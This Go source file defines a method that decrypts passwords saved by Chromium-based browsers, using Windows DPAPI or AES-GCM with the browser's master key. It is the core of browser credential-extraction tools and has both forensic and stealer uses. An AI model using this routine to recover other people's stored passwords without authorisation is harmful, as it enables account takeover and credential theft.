package browsers

import (
	"crypto/aes"
	"crypto/cipher"
	"errors"
)

// Decrypt decrypts an encrypted password using the stored master key.
func (c *Chromium) Decrypt(encryptPass []byte) ([]byte, error) {
	// If the master key is empty, use Windows' DPAPI (Data Protection API)
	if len(c.MasterKey) == 0 {
		return DPAPI(encryptPass)
	}

	if len(encryptPass) < 15 {
		return nil, errors.New("empty password")
	}

	// Split the encrypted password into nonce and cipher text
	crypted := encryptPass[15:]
	nonce := encryptPass[3:15]

	// Initialize AES cipher with the master key
	block, err := aes.NewCipher(c.MasterKey)
	if err != nil {
		return nil, err
	}

	// Initialize AES-GCM mode
	blockMode, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Decrypt the data
	origData, err := blockMode.Open(nil, nonce, crypted, nil)
	if err != nil {
		return nil, err
	}

	return origData, nil
}
